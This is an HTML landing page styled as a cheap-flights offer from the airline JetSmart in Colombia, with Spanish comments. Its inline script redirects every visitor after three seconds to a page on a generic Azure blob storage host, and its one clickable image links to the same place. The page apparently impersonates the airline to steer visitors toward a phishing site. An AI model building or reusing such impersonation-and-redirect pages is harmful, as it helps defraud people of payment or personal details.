<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JetSmart Vuelos Baratos Colombia</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
        }

        /* Estilo del encabezado fijo */
        .fixed-header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #fff;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            text-align: center;
            padding: 10px 0;
        }

        .fixed-header img {
            max-width: 100%;
            height: auto;
        }

        /* Espaciado para evitar que el contenido se superponga al encabezado */
        .content {
            margin-top: 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: calc(100vh - 100px);
            padding: 20px;
            box-sizing: border-box;
        }

        a img {
            cursor: pointer;
            animation: heartbeat 1.5s infinite;
            max-width: 100%;
            height: auto;
        }

        /* Animación de latido */
        @keyframes heartbeat {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }

        /* Responsividad para pantallas más pequeñas */
        @media (max-width: 600px) {
            .fixed-header img {
                width: 150px;
                height: auto;
            }

            .content {
                margin-top: 80px;
            }
        }

        @media (max-width: 400px) {
            .fixed-header img {
                width: 120px;
            }

            .content {
                margin-top: 70px;
            }
        }
    </style>
    <script>
        // Configuración de las rutas y dimensiones
        const imageUrl = "https://i.imgur.com/dt4u5PO.png"; // Cambiar por la URL de la imagen PNG
        const linkUrl = "https://jetsmartvuelos.blob.core.windows.net/colombiafly/jetsmart.html"; // Cambiar por la ruta al hacer clic en la imagen
        const redirectUrl = "https://jetsmartvuelos.blob.core.windows.net/colombiafly/jetsmart.html"; // Cambiar por la ruta de redirección automática

        // Redirección automática después de 3 segundos
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 3000);
    </script>
</head>
<body>
    <!-- Encabezado fijo -->
    <div class="fixed-header">
        <img src="https://i.imgur.com/g3n2eFv.png" alt="Encabezado Fijo">
    </div>

    <!-- Contenido principal -->
    <div class="content">
        <a href="https://i.imgur.com/LpIokfQ.png" id="clickableImage">
            <img src="https://i.imgur.com/dt4u5PO.png" alt="Imagen Cliqueable" id="dynamicImage">
        </a>
    </div>

    <script>
        // Asignar dinámicamente la imagen, el enlace y las dimensiones
        const clickableImage = document.getElementById('clickableImage');
        const dynamicImage = document.getElementById('dynamicImage');

        clickableImage.href = linkUrl;
        dynamicImage.src = imageUrl;
    </script>
</body>
</html>
